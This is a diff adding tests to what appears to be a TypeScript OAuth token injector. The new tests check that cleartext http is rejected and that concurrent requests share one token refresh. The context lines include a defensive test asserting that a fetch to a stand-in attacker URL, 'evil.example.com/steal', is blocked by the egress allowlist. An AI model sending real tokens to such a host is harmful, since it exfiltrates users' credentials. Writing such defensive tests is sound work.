@@ -160,6 +160,52 @@ test('injector: egress allowlist blocks disallowed hosts before any token use', 
   await assert.rejects(() => handle.fetch('https://evil.example.com/steal'), /Egress blocked/);
 });
 
+test('injector: blocks cleartext http to an allowlisted host (no bearer over the wire)', async () => {
+  const db = await openDb({ dbPath: ':memory:' });
+  const vault = new Vault(db, KEY);
+  const audit = new Audit(db);
+  const provider = github({ clientId: 'cid', clientSecret: 'csec' }); // egressAllow includes api.github.com
+  await vault.upsert(O1, 'github', { accessToken: 'tok', refreshToken: null, scopes: 'repo', expiresAt: null, externalAccount: null });
+  const handle = new ConnectionHandle(provider, O1, ID, vault, audit);
+  await assert.rejects(() => handle.fetch('http://api.github.com/user'), /requires https/);
+});
+
+test('injector: concurrent fetches share a single token refresh (no rotating-token brick)', async () => {
+  const db = await openDb({ dbPath: ':memory:' });
+  const vault = new Vault(db, KEY);
+  const audit = new Audit(db);
+  const provider = defineProvider({
+    id: 'acme', authorizeUrl: 'https://acme.example/auth', tokenUrl: 'https://acme.example/token',
+    scopesDefault: ['x'], egressAllow: ['api.acme.example'], refresh: 'rotating', pkce: true,
+    clientId: 'id', clientSecret: 'sec',
+  });
+  await vault.upsert(O1, 'acme', { accessToken: 'old', refreshToken: 'r1', scopes: 'x', expiresAt: null, externalAccount: null });
+
+  const realFetch = globalThis.fetch;
+  let tokenCalls = 0;
+  globalThis.fetch = (async (url: any, init: any) => {
+    if (String(url) === 'https://acme.example/token') {
+      tokenCalls++;
+      return new Response(JSON.stringify({ access_token: 'new', refresh_token: 'r2' }), {
+        status: 200, headers: { 'content-type': 'application/json' },
+      });
+    }
+    const auth = new Headers(init.headers).get('authorization');
+    if (auth === 'Bearer old') return new Response('expired', { status: 401 });
+    return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
+  }) as any;
+  try {
+    const inflight = new Map<string, Promise<string | null>>();
+    const h = () => new ConnectionHandle(provider, O1, ID, vault, audit, {}, inflight);
+    const [a, b] = await Promise.all([h().fetch('https://api.acme.example/x'), h().fetch('https://api.acme.example/y')]);
+    assert.equal(a.status, 200);
+    assert.equal(b.status, 200);
+    assert.equal(tokenCalls, 1); // both 401s collapsed into one refresh
+  } finally {
+    globalThis.fetch = realFetch;
+  }
+});
+
 test('injector: refreshes on 401, retries with the new token, and persists it', async () => {
   const db = await openDb({ dbPath: ':memory:' });
   const vault = new Vault(db, KEY);
